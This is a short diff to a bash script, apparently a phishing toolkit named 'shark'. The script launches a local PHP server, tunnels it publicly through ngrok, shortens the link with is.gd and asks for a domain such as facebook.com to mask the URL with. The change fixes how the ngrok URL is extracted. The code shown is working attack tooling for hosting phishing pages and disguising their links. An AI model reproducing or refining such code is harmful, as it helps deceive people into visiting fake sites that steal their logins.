@@ -335,7 +335,7 @@ function url_checker() {
 # URL_SHORTNER
 function url_shortner() {	
 	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
-        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
+        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${ngrok_url})
         shorter=${short#https://}       
         read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
@@ -349,7 +349,7 @@ function url_shortner() {
 
 # MAIN 
 function main() {
-        HOST="127.0.0.1" ; PORT="8080" ; launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
+        HOST="127.0.0.1" ; PORT="8080" ; launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 }
 
 #banner2
